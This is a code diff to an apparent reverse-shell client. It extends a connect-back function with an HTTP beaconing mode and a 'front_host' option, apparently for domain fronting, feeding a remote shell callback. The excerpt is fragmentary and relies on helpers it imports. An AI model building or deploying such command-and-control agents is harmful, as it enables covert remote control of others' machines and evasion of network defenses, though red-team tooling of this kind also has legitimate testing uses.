@@ -2,7 +2,14 @@ import socket
 import time
 
 
-def connect_and_run(host, port, shell_callback, reconnect_interval=5, encryption=False, tls=False):
+def connect_and_run(host, port, shell_callback, reconnect_interval=5,
+                    encryption=False, tls=False, http_mode=False,
+                    front_host=None):
+    if http_mode:
+        _http_beacon(host, port, shell_callback, reconnect_interval,
+                     encryption, tls, front_host)
+        return
+
     first_attempt = True
     while True:
         sock = None
@@ -23,7 +30,7 @@ def connect_and_run(host, port, shell_callback, reconnect_interval=5, encryption
             if encryption:
                 _client_key_exchange(sock)
 
-            shell_callback(sock, encryption, tls)
+            shell_callback(sock, encryption, tls, http_mode=False)
             if sock:
                 sock.close()
             break
@@ -40,6 +47,20 @@ def connect_and_run(host, port, shell_callback, reconnect_interval=5, encryption
                 except Exception:
                     pass
             raise
+
+
+def _http_beacon(host, port, shell_callback, reconnect_interval,
+                 encryption, tls, front_host):
+    scheme = 'https' if tls else 'http'
+    server_url = f'{scheme}://{host}:{port}'
+
+    from common.http_protocol import HttpBeaconProtocol
+    protocol = HttpBeaconProtocol(
+        server_url=server_url,
+        front_host=front_host,
+        sleep_time=reconnect_interval,
+    )
+    shell_callback(protocol, encryption=False, tls=False, http_mode=True)
 
 
 def _client_key_exchange(sock):
